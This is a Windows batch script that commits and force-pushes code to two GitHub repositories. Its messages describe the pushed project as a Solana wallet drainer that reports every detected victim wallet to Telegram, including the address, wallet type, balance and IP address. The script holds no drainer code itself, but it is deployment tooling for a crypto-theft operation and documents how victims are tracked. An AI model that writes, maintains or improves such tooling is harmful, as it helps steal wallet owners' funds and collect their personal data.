@echo off
echo Confirming Telegram logging setup...
echo.
echo Telegram logging features:
echo - Logs ALL wallet detections (no balance threshold)
echo - Shows wallet address (first 8 chars + ...)
echo - Shows wallet type (Phantom, Solflare, etc.)
echo - Shows balance (0.000000 SOL initially, updated by drainer)
echo - Shows IP address
echo.
echo Committing Telegram logging improvements...
git add .
git commit -m "CONFIRM: Telegram wallet detection logs all wallets with type info"
echo.
echo Pushing to Emi-lokan repository...
git push origin master
echo.
echo Pushing to Lombard repository...
git remote add lombard https://github.com/SacredPath/Lombard.git
git fetch lombard
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
git push lombard %CURRENT_BRANCH%:main --force
git remote remove lombard
echo.
echo Done! Telegram logging confirmed and pushed to both repositories.
echo.
echo Summary:
echo - All wallet detections will be logged to Telegram
echo - Wallet type information included in messages
echo - No balance threshold blocking wallet detection
echo - Both repositories updated with latest changes
pause
